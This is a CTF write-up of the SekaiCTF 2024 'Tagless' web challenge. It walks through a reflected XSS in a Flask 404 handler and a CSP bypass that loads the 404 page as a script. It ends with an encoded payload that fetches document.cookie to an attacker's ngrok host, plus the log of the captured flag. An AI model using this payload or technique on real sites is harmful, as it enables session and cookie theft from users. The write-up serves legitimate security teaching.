# Tagless

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

</details>

## Overview

- Solved by: @jose.fk
- Contributor: @siunam
- 160 solves / 100 points
- Author: @elleuch
- Overall difficulty for me (From 1-10 stars): ★★★☆☆☆☆☆☆☆

## Background

Who needs tags anyways

![](https://github.com/siunam321/CTF-Writeups/blob/main/SekaiCTF-2024/images/Pasted%20image%2020240826144638.png)

## Enumeration

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/SekaiCTF-2024/images/Pasted%20image%2020240826144718.png)

In here, we can enter a message, and it'll be reflected to the white box below:

![](https://github.com/siunam321/CTF-Writeups/blob/main/SekaiCTF-2024/images/Pasted%20image%2020240826144958.png)

There's not much we can do in here, let's read this web application's source code!

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/SekaiCTF-2024/Web/Tagless/dist.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/SekaiCTF-2024/Web/Tagless)-[2024.08.26|14:50:56(HKT)]
└> file dist.zip       
dist.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
┌[siunam♥Mercury]-(~/ctf/SekaiCTF-2024/Web/Tagless)-[2024.08.26|14:50:58(HKT)]
└> unzip dist.zip     
Archive:  dist.zip
  inflating: Dockerfile              
  inflating: build-docker.sh         
 extracting: requirements.txt        
   creating: src/
  inflating: src/app.py              
  inflating: src/bot.py              
   creating: src/static/
  inflating: src/static/app.js       
   creating: src/templates/
  inflating: src/templates/index.html  
```

First off, what's our objective in this challenge? Where's the flag?

In `src/bot.py`, we can see that the flag is in the `flag` cookie:

```python
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import time 

class Bot:
    def __init__(self):
        chrome_options = Options()
        chrome_options.add_argument("--headless")  
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--no-sandbox") 
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-extensions") 
        chrome_options.add_argument("--window-size=1920x1080") 
        
        self.driver = webdriver.Chrome(options=chrome_options)

    def visit(self, url):
        self.driver.get("http://127.0.0.1:5000/")
        
        self.driver.add_cookie({
            "name": "flag", 
            "value": "SEKAI{dummy}", 
            "httponly": False  
        }) 
        
        self.driver.get(url)
        time.sleep(1)
        self.driver.refresh()
        print(f"Visited {url}")

    def close(self):
        self.driver.quit()
```

As you can see, when the `visit` method is called, it'll launch a headless Chrome browser, go to `http://127.0.0.1:5000/`, set cookie `flag` with the real flag value and attribute `httponly` set to `False`. After that, it'll go to the `url` page.

**In `src/app.py` POST route `/report`, we can send a `url` parameter to the method `visit`:**
```python
from flask import Flask, render_template, make_response,request
from bot import *
from urllib.parse import urlparse

app = Flask(__name__, static_folder='static')
[...]
@app.route("/report", methods=["POST"])
def report():
    bot = Bot()
    url = request.form.get('url')
    if url:
        try:
            parsed_url = urlparse(url)
        except Exception:
            return {"error": "Invalid URL."}, 400
        if parsed_url.scheme not in ["http", "https"]:
            return {"error": "Invalid scheme."}, 400
        if parsed_url.hostname not in ["127.0.0.1", "localhost"]:
            return {"error": "Invalid host."}, 401
        
        bot.visit(url)
        bot.close()
        return {"visited":url}, 200
    else:
        return {"error":"URL parameter is missing!"}, 400
```

Therefore, our goal is to let the headless Chrome (Bot) to **trigger our client-side vulnerability payload to exfiltrate the `flag` cookie**.

Let's find a client-side vulnerability then!

**One route stood out the most is the 404 error route:**
```python
@app.errorhandler(404)
def page_not_found(error):
    path = request.path
    return f"{path} not found"
```

In here, when the Flask application encountered an HTTP status code "404 Not Found", it'll call function `page_not_found`. In this function, **it directly parses our request's URL path (`request.path`) to `f"{path} not found"`.**

Since there's no sanitization/HTML entity encoding/escaping, it's vulnerable to XSS (Cross-Site Scripting). More specifically, it's **reflected XSS**.

Let's try to inject a `<script>` tag:

![](https://github.com/siunam321/CTF-Writeups/blob/main/SekaiCTF-2024/images/Pasted%20image%2020240826151002.png)

We successfully injected a `<script>` tag! However, there's no alert box as we expected. Why?

Well, if we look at the console tab, we can see an error:

![](https://github.com/siunam321/CTF-Writeups/blob/main/SekaiCTF-2024/images/Pasted%20image%2020240826151115.png)

It's because the **CSP (Content Security Policy)'s `script-src` directive is blocking it**!

In `src/app.py`'s [`after_request`](https://flask.palletsprojects.com/en/2.3.x/api/#flask.Flask.after_request) decorator, we can see that all responses have the following CSP:

```python
@app.after_request
def add_security_headers(resp):
    resp.headers['Content-Security-Policy'] = "script-src 'self'; style-src 'self' https://fonts.googleapis.com https://unpkg.com 'unsafe-inline'; font-src https://fonts.gstatic.com;"
    return resp
```

Let's copy the CSP to [Google CSP Evaluator](https://csp-evaluator.withgoogle.com/) and see how can we bypass it:

![](https://github.com/siunam321/CTF-Writeups/blob/main/SekaiCTF-2024/images/Pasted%20image%2020240826151448.png)

In the `script-src` directive, since there's no `unsafe-inline` source, we can't execute arbitrary JavaScript code using inline `<script>` tag. However, **it has source `self`, maybe we can use this source to bypass the `script-src` directive CSP**?

Well yes we can! In the 404 error page, **the injected `<script>` tag can include the 404 error page**, such as the following:

```html
<script src="/alert(document.domain)"></script>
```

That way, our injected `<script>` tag can execute arbitrary JavaScript code in the `src` attribute! Let's try it!

![](https://github.com/siunam321/CTF-Writeups/blob/main/SekaiCTF-2024/images/Pasted%20image%2020240826152427.png)

Hmm... We got a JavaScript syntax error. Well, this is expected because the 404 error page has some invalid JavaScript syntax:

![](https://github.com/siunam321/CTF-Writeups/blob/main/SekaiCTF-2024/images/Pasted%20image%2020240826152548.png)

To solve this, we can use the multi-line comment syntax `/*` and `*/`, as well as the single line comment syntax `//`:

```html
<script src="/**/alert(document.domain)//"></script>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/SekaiCTF-2024/images/Pasted%20image%2020240826152745.png)

Nice! It worked! We successfully bypassed the CSP!

## Exploitation

Armed with the above information, we can exfiltrate the bot's `flag` cookie to our attacker server.

To do so, we can:

- Set up a simple HTTP server via Python's `http.server` module

```shell
┌[siunam♥Mercury]-(~/ctf/SekaiCTF-2024/Web/Tagless)-[2024.08.26|15:30:05(HKT)]
└> python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

- Set up port forwarding via Ngrok to serve our internal HTTP server to external network

```shell
┌[siunam♥Mercury]-(~/ctf/SekaiCTF-2024/Web/Tagless)-[2024.08.26|15:30:04(HKT)]
└> ngrok http 80
[...]
Forwarding                    https://50e6-{Redacted}.ngrok-free.app -> http://localhost:80            
[...]
```

- Send the following payload to the bot via the POST route `/report`

```
http://127.0.0.1:5000/%25%33%63%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%32%30%25%37%33%25%37%32%25%36%33%25%33%64%25%32%32%25%32%35%25%33%32%25%36%36%25%32%35%25%33%32%25%36%31%25%32%35%25%33%32%25%36%31%25%32%35%25%33%32%25%36%36%25%32%35%25%33%36%25%33%36%25%32%35%25%33%36%25%33%35%25%32%35%25%33%37%25%33%34%25%32%35%25%33%36%25%33%33%25%32%35%25%33%36%25%33%38%25%32%35%25%33%32%25%33%38%25%32%35%25%33%36%25%33%30%25%32%35%25%33%36%25%33%38%25%32%35%25%33%37%25%33%34%25%32%35%25%33%37%25%33%34%25%32%35%25%33%37%25%33%30%25%32%35%25%33%37%25%33%33%25%32%35%25%33%33%25%36%31%25%32%35%25%33%32%25%36%36%25%32%35%25%33%32%25%36%36%25%32%35%25%33%33%25%33%35%25%32%35%25%33%33%25%33%30%25%32%35%25%33%36%25%33%35%25%32%35%25%33%33%25%33%36%25%32%35%25%33%32%25%36%34%25%32%35%25%33%37%25%36%32%25%32%35%25%33%35%25%33%32%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%34%25%32%35%25%33%36%25%33%31%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%34%25%32%35%25%33%37%25%36%34%25%32%35%25%33%32%25%36%35%25%32%35%25%33%36%25%36%35%25%32%35%25%33%36%25%33%37%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%32%25%32%35%25%33%32%25%36%34%25%32%35%25%33%36%25%33%36%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%35%25%32%35%25%33%32%25%36%35%25%32%35%25%33%36%25%33%31%25%32%35%25%33%37%25%33%30%25%32%35%25%33%37%25%33%30%25%32%35%25%33%32%25%36%36%25%32%35%25%33%33%25%36%36%25%32%35%25%33%36%25%33%33%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%32%25%32%35%25%33%36%25%33%39%25%32%35%25%33%36%25%33%35%25%32%35%25%33%33%25%36%34%25%32%35%25%33%32%25%33%34%25%32%35%25%33%37%25%36%32%25%32%35%25%33%36%25%33%34%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%35%25%32%35%25%33%36%25%36%34%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%35%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%36%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%32%25%32%35%25%33%36%25%33%39%25%32%35%25%33%36%25%33%35%25%32%35%25%33%37%25%36%34%25%32%35%25%33%36%25%33%30%25%32%35%25%33%32%25%33%39%25%32%35%25%33%32%25%36%36%25%32%35%25%33%32%25%36%36%25%32%32%25%33%65%25%33%63%25%32%66%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%65
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/SekaiCTF-2024/images/Pasted%20image%2020240826153530.png)

URL decoded payload:

```html
<script src="/**/fetch(`https://50e6-{Redacted}.ngrok-free.app/?cookie=${document.cookie}`)//"></script>
```

HTTP server log:

```shell
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
127.0.0.1 - - [26/Aug/2024 15:42:05] "GET /?cookie=flag=SEKAI{w4rmUpwItHoUtTags} HTTP/1.1" 200 -
```

Nice! We got the flag!

- **Flag: `SEKAI{w4rmUpwItHoUtTags}`**

## Conclusion

What we've learned:

1. Reflected XSS and CSP bypass